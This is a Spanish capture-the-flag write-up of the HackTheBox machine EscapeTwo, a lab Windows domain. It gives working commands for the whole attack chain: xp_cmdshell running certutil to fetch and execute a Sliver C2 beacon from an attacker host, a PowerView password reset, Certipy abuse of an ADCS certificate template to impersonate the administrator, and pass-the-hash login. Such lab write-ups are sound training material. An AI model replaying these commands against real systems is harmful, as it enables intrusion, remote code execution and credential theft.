---
title: "EscapeTwo - HackTheBox"
slug: "htb-escapetwo"
date: 2025-10-25
platform: htb
difficulty: medium
lang: es
tags:
  - active-directory
  - mssql
  - sliver
  - c2
  - adcs
  - certipy
  - bloodhound
  - privesc
excerpt: "Máquina Windows AD «Sequel» (EscapeTwo) de HackTheBox: de un xlsx corrupto con credenciales a MSSQL y C2 con Sliver, escalando vía ADCS (ESC) con Certipy hasta Administrator."
draft: false
---

EscapeTwo (dominio `sequel.htb`) es una máquina Windows clasificada como «Media» en HackTheBox, centrada en Active Directory. El recorrido pasa por unas credenciales escondidas en un `xlsx` corrupto, acceso a MSSQL y un C2 con Sliver, hasta escalar al dominio abusando de AD CS (ESC) con Certipy.

## Portscan
Se realiza el escaneo de puertos con nmap.
```bash
nmap -p- --min-rate 1500 -n -Pn -vvv --open 10.129.5.93 -oN 1stScan
```

![](/assets/images/htb-escapetwo/htb-escapetwo-1.png)
## User Flag
HTB nos proporciona unas primeras credenciales para enumerar
```plaintext
rose / KxEPkKe6R8su
```
Con estas credenciales podemos enumerar recursos compartidos en el dominio.
```bash
nxc smb 10.129.5.93 -u 'rose' -p 'KxEPkKe6R8su' --shares
```
Un recurso compartido interesante es `Accounting Department`, que contiene unos archivos en formato `xlsx`:
```bash
smbclient '//sequel.htb/Accounting Department' -U 'rose%KxEPkKe6R8su'
```

![](/assets/images/htb-escapetwo/htb-escapetwo-2.png)
Revisando el archivo `accounts.xlsx`, notamos que es un archivo zip, es probable que el archivo esté corrupto, así que revisando los `magic numbers` del archivo, notamos que se muestra `5048 0403`, cuando debería ser `504B 0304` para identificarse como un archivo `xlsx`.
Así que se procedió a realizar los cambios para que se identifique de manera correcta.
```bash
perl -p -i -e 's/\x50\x48\x04\x03/\x50\x4B\x03\x04/' accounts.xlsx
```

![](/assets/images/htb-escapetwo/htb-escapetwo-3.png)

Dentro de este archivo encontramos unas credenciales.
![](/assets/images/htb-escapetwo/htb-escapetwo-4.png)
La más llamativa es la de `mssql`, así que probando la conexión por ahí tenemos acceso a la db.

```plaintext
sa:MSSQLP@ssw0rd!
```

```bash
impacket-mssqlclient sequel.htb/sa@10.129.5.93
```

![](/assets/images/htb-escapetwo/htb-escapetwo-5.png)
Dentro de `mssql` podemos ejecutar comandos, así que crearemos un `beacon` con `sliver` para luego poder realizar la subida de este archivo.
```bash
# Creación del beacon
generate beacon --mtls 10.10.15.89:443 --os windows --arch amd64 --format exe --seconds 5 --jitter 3

# Ponernos en escucha
mtls -L 10.10.15.89 -l 443

# Confirmar el listener
jobs
```

![](/assets/images/htb-escapetwo/htb-escapetwo-6.png)
Ahora tenemos que pasar el ejecutable creado a la máquina victima, usamos `certutil` que trae windows, mientras en nuestra máquina atacante servimos el archivo.
```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.15.89:80/INEVITABLE_TREAT.exe C:\Users\sql_svc\Desktop\INEVITABLE_TREAT.exe';
```

![](/assets/images/htb-escapetwo/htb-escapetwo-7.png)

Una vez subido el `beacon`, debemos ejecutarlo:
```sql
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\INEVITABLE_TREAT.exe'
```

![](/assets/images/htb-escapetwo/htb-escapetwo-8.png)
Revisamos en nuestro cliente de `sliver` y tendremos la conexión entablada.
![](/assets/images/htb-escapetwo/htb-escapetwo-9.png)

Ahora podemos interactuar con el `beacon`.
```bash
use 07e9c7f5
```

![](/assets/images/htb-escapetwo/htb-escapetwo-10.png)

En la ruta `C:\SQL2019\ExpressAdv_ENU\` podemos encontrar un archivo `sql-Configuration.INI`, el cual es posible su descarga y con ayuda de `sliver` lo descargamos.

```bash
download sql-Configuration.INI
```

![](/assets/images/htb-escapetwo/htb-escapetwo-11.png)

![](/assets/images/htb-escapetwo/htb-escapetwo-12.png)

Revisando el archivo, nos dice que es un comprimido `gzip`, por tanto descomprimimos y guardamos en un archivo `.txt`.
```bash
# Revisar el tipo de archivo
file sql-Configuration.INI

# Descomprimir
gunzip -c sql-Configuration.INI > sql-Configuration.txt
```

![](/assets/images/htb-escapetwo/htb-escapetwo-13.png)

Ahora podemos leer el archivo `txt` donde nos encontramos una posible contraseñas.
![](/assets/images/htb-escapetwo/htb-escapetwo-14.png)
```plaintext
WqSZAF6CysDQbGb3
```

Generamos una sesión interactiva en sliver para explorar en el dominio que usuarios podríamos atacar:
```bash
# Genera sesión interactivo
interactive

# Usar sesión interactiva
sessions -i c56
```

![](/assets/images/htb-escapetwo/htb-escapetwo-15.png)

Dentro del directorio `C:\users` encontramos `ryan`, por lo tanto podemos intentar probar la contraseña anterior contra el.

![](/assets/images/htb-escapetwo/htb-escapetwo-16.png)

Al probar las credenciales, pudimos tener acceso por winrm a través de `evil-winrm`.
```bash
evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
```

![](/assets/images/htb-escapetwo/htb-escapetwo-17.png)
## Privesc

De nuevo subiré el `beacon` para fines de práctica.
```bash
# Subir el beacon
upload Ryan.exe

# Ejecutarlo
.\Ryan.exe
```

Recibimos la conexión en sliver para comenzar a usarla.
![](/assets/images/htb-escapetwo/htb-escapetwo-18.png)

Ahora con ayuda de sliver subiremos `SharpHound.exe` para una enumeración del dominio.
```bash
execute-assembly SharpHound.exe --collectionmethods All
```

![](/assets/images/htb-escapetwo/htb-escapetwo-19.png)

Ahora podemos descargar el zip generado para usar en `BloodHound`
```bash
download 20251025171541_BloodHound.zip
```

![](/assets/images/htb-escapetwo/htb-escapetwo-20.png)

Posteriormente, se importará el archivo a `BloodHound` para encontrar vectores para una escalada de privilegios.

Notamos que `ryan` tiene permisos `WriteOwner` sobre `CA_SVC`.
![](/assets/images/htb-escapetwo/htb-escapetwo-21.png)

Abusando de ese privilegio, podemos ejecutar el cambio de contraseña del usuario `ca_svc` usando `PowerView.ps1`
```bash
# Subir PowerView
upload PowerView.ps1

# Cambiarle la contraseña al usuario
execute powershell -ExecutionPolicy Bypass -Command "& {Import-Module C:\Users\ryan\Desktop\PowerView.ps1; Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity 'ryan'; Add-DomainObjectAcl -TargetIdentity 'ca_svc' -Rights ResetPassword -PrincipalIdentity 'ryan'; $cred = ConvertTo-SecureString 'Password' -AsPlainText -Force; Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $cred}"
```

![](/assets/images/htb-escapetwo/htb-escapetwo-22.png)

Para confirmar que nuestros cambios se aplicaron podemos usar `nxc`.
```bash
nxc smb sequel.htb -u ca_svc -p 'Password'
```

![](/assets/images/htb-escapetwo/htb-escapetwo-23.png)

Mirando el bloodhound, podemos observar que el usuario `ca_svc` pertenece al grupo `Cert Publishers` y según BloodHound, sus miembros tienen permiso para publicar certificados en el directorio.
![](/assets/images/htb-escapetwo/htb-escapetwo-24.png)

Entonces, usamos las credenciales de `ca_svc` para enumerar con `Certipy` las plantillas y configuraciones de certificados en `Active Directory Certificate Services (ADCS)`.
```bash
certipy-ad find -u 'ca_svc@sequel.htb' -p 'Password' -dc-ip 10.129.5.93 -stdout
```

Observamos que la plantilla `DunderMifflinAuthentication` es vulnerable ya que el grupo `Cert Publishers` tiene permisos peligrosos.
![](/assets/images/htb-escapetwo/htb-escapetwo-25.png)

Modificamos esta plantilla para que pueda ser explotada por `ca_svc`, usando  `certipy template` y guardando una copia de seguridad de la configuración original.
```bash
# Guardar las plantillas
certipy-ad find -u 'ca_svc@sequel.htb' -p 'Password' -dc-ip 10.129.5.93 -stdout > templates.txt

# Modificar el template vulnerable
certipy-ad template -u ca_svc@sequel.htb -p 'Password' \     
    -template DunderMifflinAuthentication \
    -write-default-configuration \
    -save-configuration DunderMifflinAuthentication_backup.json \
    -dc-ip 10.129.5.93 -force
```

![](/assets/images/htb-escapetwo/htb-escapetwo-26.png)

Ahora solicitamos un certificado un certificado para identificarnos como el administrador del dominio, algo así como:
“Hola, soy `ca_svc`, y quiero que me emitas un certificado que identifique al usuario `administrator@sequel.htb`.”
```bash
certipy-ad req -u ca_svc@sequel.htb -p 'Password' \     
  -ca sequel-DC01-CA \                   
  -template DunderMifflinAuthentication \
  -target dc01.sequel.htb \                          
  -upn administrator@sequel.htb \
  -dc-ip 10.129.5.93
```

![](/assets/images/htb-escapetwo/htb-escapetwo-27.png)

Ahora extraemos los hashes de `Administrator` con el nuevo certificado generado.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.5.93 -domain sequel.htb
```

Finalmente realizamos la conexión con  `evil-winrm` haciendo un `PtH`.
```bash
evil-winrm -i sequel.htb -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```
![](/assets/images/htb-escapetwo/htb-escapetwo-28.png)

## Conclusiones
Así completamos EscapeTwo, consiguiendo las flags de user y root. Una máquina muy completa para practicar el abuso de MSSQL, el movimiento con un C2 como Sliver, la enumeración con BloodHound y la explotación de plantillas vulnerables en AD CS con Certipy. ¡Nos vemos en la siguiente!
